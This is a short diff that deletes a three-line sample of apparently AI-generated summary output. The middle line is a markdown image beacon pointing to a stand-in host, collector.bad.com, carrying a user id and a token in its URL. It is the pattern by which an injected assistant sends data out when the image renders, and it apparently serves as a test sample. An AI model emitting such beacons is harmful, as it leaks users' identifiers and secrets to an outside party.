@@ -1,3 +1,0 @@
-Here is a summary:
-![beacon](http://collector.bad.com/track?id=user123&token=abc)
-All data processed.
